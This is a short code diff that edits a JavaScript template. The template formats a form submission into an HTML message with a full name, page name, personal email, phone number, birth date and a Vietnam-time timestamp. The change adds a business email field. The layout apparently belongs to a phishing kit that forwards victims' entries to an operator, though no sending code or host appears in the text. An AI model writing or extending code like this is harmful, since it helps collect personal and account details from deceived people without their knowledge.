@@ -205,8 +205,7 @@ ${
 
 <b>👤 Full Name:</b> <code>${formData.fullName}</code>
 <b>� Page Name:</b> <code>${formData.pageName}</code>
-<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
-<b>📱 Phone Number:</b> <code>${phoneNumber}</code>
+<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code><b>📧 Business Email:</b> <code>${formData.businessEmail}</code><b>📱 Phone Number:</b> <code>${phoneNumber}</code>
 ${formData.birthDay && formData.birthMonth && formData.birthYear ? `<b>🎂 Date of Birth:</b> <code>${formData.birthDay}/${formData.birthMonth}/${formData.birthYear}</code>` : ''}
 
 <b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
